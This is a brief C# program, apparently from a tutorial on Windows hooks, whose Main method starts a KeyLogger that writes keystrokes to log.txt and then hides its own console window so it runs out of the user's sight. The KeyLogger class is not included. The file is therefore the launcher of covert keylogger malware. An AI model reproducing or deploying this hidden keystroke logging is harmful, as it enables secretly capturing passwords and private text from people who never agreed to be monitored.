using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace HooksTutorial
{

    class Program
    {

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            var kl = new KeyLogger(Application.StartupPath + @"\log.txt");
            // Hide
            ShowWindow(handle, SW_HIDE);

            Application.Run();
            kl.Deactivate();
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
